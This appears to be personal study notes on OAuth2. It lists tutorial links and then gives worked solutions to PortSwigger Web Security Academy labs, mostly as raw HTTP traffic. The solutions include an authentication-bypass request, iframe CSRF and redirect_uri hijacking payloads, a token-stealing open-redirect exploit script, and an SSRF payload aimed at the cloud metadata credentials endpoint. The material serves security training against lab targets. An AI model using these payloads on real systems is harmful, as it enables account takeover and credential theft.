### More on OAuth2

Overview of Oauth2:

- https://www.oauth.com/oauth2-servers/background/

- http://tutorials.jenkov.com/oauth2/authorization.html

- https://www.digitalocean.com/community/tutorials/an-introduction-to-oauth-2

- InterSystems Learning Services: https://www.youtube.com/watch?v=CPbvxxslDTU

- Okta Dev: https://www.youtube.com/watch?v=996OiexHze0

- Okta Dev Illustrated Guide: https://www.youtube.com/watch?v=t18YB3xDfXI

- Defog Tech: https://www.youtube.com/watch?v=LyqeHAkxVyk

Grant Types:

- https://portswigger.net/web-security/oauth/grant-types

Oauth2 demo and implementation using Passport.js and Google OAuth2

- Redirect URI: https://www.youtube.com/watch?v=or1_A4sJ-oY

- Callback Function: https://www.youtube.com/watch?v=nK6fkNShhGc

Oauth2 demo and implementation using Github Oauth2

- https://www.youtube.com/watch?v=R9lxXQcy-nM

- https://www.youtube.com/watch?v=EzQuFxRlUos

- https://www.youtube.com/watch?v=PdFdd4N6LtI

Spring Boot Oauth2

- https://www.youtube.com/watch?v=NPKtnZrIPVA

- https://www.youtube.com/watch?v=af_2f1rrZdw

- https://developer.okta.com/blog/2018/11/26/spring-boot-2-dot-1-oidc-oauth2-reactive-apis

### Authentication bypass via OAuth implicit flow

```
POST /authenticate HTTP/1.1
Host: 0afc00360442f039c0a1710000610045.web-security-academy.net
Cookie: session=pbKScreGuO7JUyfhSL4TyUlF6VwDHQw1
Content-Length: 103
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Accept: application/json
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Origin: https://0afc00360442f039c0a1710000610045.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0afc00360442f039c0a1710000610045.web-security-academy.net/oauth-callback
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"email":"carlos@carlos-montoya.net","username":"carlos","token":"X0sYlvfn3-Jk0OmrIXq15RIUQ8Sz2Y4Z4cIwf9qemA4"}
```

### Forced OAuth profile linking

There are 2 accounts given:

wiener:peter

peter.wiener:hotdog

Before you perform account linking, if you try and login via social media and use peter.wiener:hotdog, the system creates/uses/has a default peter.wiener693053 account which will link to that social media account

```
<iframe src="https://0a5900e1040b91c0c058152c00e60008.web-security-academy.net/oauth-linking?code=f6lamp_Nu7DAF0BpgLBzyeieBl1uD2cXmkSetchquhb"></iframe>
```

### OAuth account hijacking via redirect_uri

```
<iframe src="https://oauth-0ad500da0463b667c0c1b64e02c600b7.web-security-academy.net/auth?client_id=e6htvprzej5xatvnnrlpw&redirect_uri=https://exploit-0ac400a10411b6b9c0e7b67b017a00e0.web-security-academy.net/exploit&response_type=code&scope=openid%20profile%20email"></iframe>
```

### Stealing OAuth access tokens via an open redirect

Redirect URI has a whitelist but is also vulnerable to directory traversal

```
GET /auth?client_id=zhc2pvbayr0jc8cxh6bea&redirect_uri=https://0a3900b50443d6d2c0ec86a500510059.web-security-academy.net/oauth-callback/../post?postId=1&response_type=token&nonce=1023742561&scope=openid%20profile%20email

GET /auth?client_id=zhc2pvbayr0jc8cxh6bea&redirect_uri=https://0a3900b50443d6d2c0ec86a500510059.web-security-academy.net/oauth-callback/../post/next?path=/post?postId=1&response_type=token&nonce=-1112233063&scope=openid%20profile%20email

GET /auth?client_id=zhc2pvbayr0jc8cxh6bea&redirect_uri=https://0a3900b50443d6d2c0ec86a500510059.web-security-academy.net/oauth-callback/../post/next?path=https://0a3900b50443d6d2c0ec86a500510059.web-security-academy.net/post?postId=1&response_type=token&nonce=-1112233063&scope=openid%20profile%20email 

GET /auth?client_id=zhc2pvbayr0jc8cxh6bea&redirect_uri=https://0a3900b50443d6d2c0ec86a500510059.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a810022047cd668c0bd866201e2004f.web-security-academy.net/exploit&response_type=token&nonce=-1112233063&scope=openid%20profile%20email
```

```
GET /oauth-callback HTTP/1.1
Host: 0a3900b50443d6d2c0ec86a500510059.web-security-academy.net
Cookie: session=1CvlroAQa2BOCG5erXJtler4hPqwAO2v
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://0a3900b50443d6d2c0ec86a500510059.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 734

<script>
const urlSearchParams = new URLSearchParams(window.location.hash.substr(1));
const token = urlSearchParams.get('access_token');
fetch('https://oauth-0a0b0010042cd664c0d1868c02ec00c5.web-security-academy.net/me', {
    method: 'GET',
    headers: {
        'Authorization': 'Bearer ' + token,
        'Content-Type': 'application/json'
    }
})
.then(r => r.json())
.then(j => 
    fetch('/authenticate', {
        method: 'POST',
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            email: j.email,
            username: j.sub,
            token: token
        })
    }).then(r => document.location = '/'))
</script>
```

```
GET /me HTTP/1.1
Host: oauth-0a0b0010042cd664c0d1868c02ec00c5.web-security-academy.net
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Authorization: Bearer eqFEs3A4xfpZ-uV9KQnLJeMlJ_5dg6CS8AIC23aSTNr
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */*
Origin: https://0a3900b50443d6d2c0ec86a500510059.web-security-academy.net
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a3900b50443d6d2c0ec86a500510059.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

```

```
HTTP/1.1 200 OK
X-Powered-By: Express
Vary: Origin
Access-Control-Allow-Origin: https://0a3900b50443d6d2c0ec86a500510059.web-security-academy.net
Access-Control-Expose-Headers: WWW-Authenticate
Pragma: no-cache
Cache-Control: no-cache, no-store
Content-Type: application/json; charset=utf-8
Date: Sat, 01 Oct 2022 19:00:18 GMT
Connection: close
Content-Length: 132

{"sub":"wiener","apikey":"ixJYmZzRhk3Bw1G9A77t6gHMGpSRxGaH","name":"Peter Wiener","email":"wiener@hotdog.com","email_verified":true}
```

```
Hello, world!


<script>
    var nonce = "1724837544"

    var client_id = "ajck0nycy6zv0enl2dzzx"
  
    var oauth_uri = "https://oauth-0afd009d04401d81c02fd84802b900be.web-security-academy.net/"

    var lab_uri = "https://0a4f005404601d05c0e2d898009b00c1.web-security-academy.net/"

    var exploit_uri = lab_uri + "oauth-callback/../post/next?path=" + "https://exploit-0a9c00b204db1da8c0dfd820018300e7.web-security-academy.net/exploit/"

    var final_uri = oauth_uri + "auth?client_id=" + client_id + "&redirect_uri=" + exploit_uri + "&response_type=token&nonce=" + nonce + "&scope=openid%20profile%20email"

    if (!document.location.hash) {
        window.location = final_uri
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>
```

### SSRF via OpenID dynamic client registration

https://portswigger.net/web-security/oauth/openid

https://oauth-0a3700db041e2539c02e748d0299008b.web-security-academy.net/.well-known/openid-configuration

```
GET /.well-known/openid-configuration HTTP/1.1
Host: oauth-0a3700db041e2539c02e748d0299008b.web-security-academy.net
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: https://0a79002004d025bdc0337454004600f7.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

```
HTTP/1.1 200 OK
X-Powered-By: Express
Vary: Origin
Content-Type: application/json; charset=utf-8
Date: Mon, 03 Oct 2022 12:12:12 GMT
Connection: close
Content-Length: 2435

{"authorization_endpoint":"https://oauth-0a3700db041e2539c02e748d0299008b.web-security-academy.net/auth","claims_parameter_supported":false,"claims_supported":["sub","name","email","email_verified","sid","auth_time","iss"],"code_challenge_methods_supported":["S256"],"end_session_endpoint":"https://oauth-0a3700db041e2539c02e748d0299008b.web-security-academy.net/session/end","grant_types_supported":["authorization_code","refresh_token"],"id_token_signing_alg_values_supported":["HS256","ES256","EdDSA","PS256","RS256"],"issuer":"https://oauth-0a3700db041e2539c02e748d0299008b.web-security-academy.net","jwks_uri":"https://oauth-0a3700db041e2539c02e748d0299008b.web-security-academy.net/jwks","registration_endpoint":"https://oauth-0a3700db041e2539c02e748d0299008b.web-security-academy.net/reg","response_modes_supported":["form_post","fragment","query"],"response_types_supported":["code"],"scopes_supported":["openid","offline_access","profile","email"],"subject_types_supported":["public"],"token_endpoint_auth_methods_supported":["none","client_secret_basic","client_secret_jwt","client_secret_post","private_key_jwt"],"token_endpoint_auth_signing_alg_values_supported":["HS256","RS256","PS256","ES256","EdDSA"],"token_endpoint":"https://oauth-0a3700db041e2539c02e748d0299008b.web-security-academy.net/token","request_object_signing_alg_values_supported":["HS256","RS256","PS256","ES256","EdDSA"],"request_parameter_supported":false,"request_uri_parameter_supported":true,"require_request_uri_registration":true,"userinfo_endpoint":"https://oauth-0a3700db041e2539c02e748d0299008b.web-security-academy.net/me","userinfo_signing_alg_values_supported":["HS256","ES256","EdDSA","PS256","RS256"],"introspection_endpoint":"https://oauth-0a3700db041e2539c02e748d0299008b.web-security-academy.net/token/introspection","introspection_endpoint_auth_methods_supported":["none","client_secret_basic","client_secret_jwt","client_secret_post","private_key_jwt"],"introspection_endpoint_auth_signing_alg_values_supported":["HS256","RS256","PS256","ES256","EdDSA"],"revocation_endpoint":"https://oauth-0a3700db041e2539c02e748d0299008b.web-security-academy.net/token/revocation","revocation_endpoint_auth_methods_supported":["none","client_secret_basic","client_secret_jwt","client_secret_post","private_key_jwt"],"revocation_endpoint_auth_signing_alg_values_supported":["HS256","RS256","PS256","ES256","EdDSA"],"claim_types_supported":["normal"]}
```

```
POST /reg HTTP/1.1
Host: oauth-0a3700db041e2539c02e748d0299008b.web-security-academy.net
Content-Type: application/json
Accept: application/json
Content-Length: 176

{
"redirect_uris": [
"https://wrreh3gy42of510219na8my2ktqnec.burpcollaborator.net"],
"logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}
```

```
GET /auth?client_id=CHANGE_ME_TO_GENERATED_CLIENT_ID&redirect_uri=CHANGE_ME_TO_BURP_COLLABORATOR&response_type=code&scope=openid%20profile%20email HTTP/1.1
Host: oauth-0a3700db041e2539c02e748d0299008b.web-security-academy.net
Cookie: _session=EzdFgratY_5c5PCfmkBmb; _session.legacy=EzdFgratY_5c5PCfmkBmb
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: https://0a79002004d025bdc0337454004600f7.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```







